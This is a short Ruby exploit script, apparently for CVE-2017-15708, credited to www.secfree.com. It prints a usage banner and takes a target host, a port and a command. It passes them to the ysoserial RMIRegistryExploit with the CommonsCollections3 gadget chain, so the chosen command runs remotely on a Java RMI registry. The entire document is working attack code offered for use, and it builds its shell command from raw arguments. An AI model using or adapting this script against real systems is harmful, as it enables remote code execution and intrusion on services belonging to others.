require "open-uri"

def payload(* argv)
	cmd = system "java -cp ysoserial-v0.0.4.jar ysoserial.exploit.RMIRegistryExploit #{argv[0]} #{argv[1]} CommonsCollections3 #{argv[2]}"
end

if ARGV.length > 0
	payload(ARGV[0],ARGV[1],ARGV[2])
else
	puts "########################################################"
	puts "#                                                      #"
	puts "#                   CVE-2017-15708.rb                  #"
	puts "#                    www.secfree.com                   #"
	puts "#                                                      #"
	puts "########################################################"
	puts "  Usage: ruby exploit.rb <TargetHost> <Port> <command>"
end
